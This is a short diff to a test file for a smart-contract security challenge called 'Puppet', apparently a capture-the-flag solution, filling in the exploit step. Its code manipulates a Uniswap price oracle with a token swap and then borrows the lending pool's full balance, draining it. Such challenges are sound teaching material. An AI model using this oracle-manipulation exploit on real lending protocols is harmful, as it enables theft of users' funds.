@@ -93,6 +93,17 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        
+        // Approve token to be swapped
+        const tokenAmount = ether('1')
+        await this.token.approve(this.uniswapExchange.address, tokenAmount, { from: attacker });
+
+        // Swap token to exploit oracle vulnerability
+        const deadline = (await web3.eth.getBlock('latest')).timestamp * 2;
+        await this.uniswapExchange.tokenToEthSwapInput(tokenAmount, 1, deadline, { from: attacker });
+
+        // Drain all funds due to oracle returning 0
+        await this.lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, { from: attacker });
     });
 
     after(async function () {
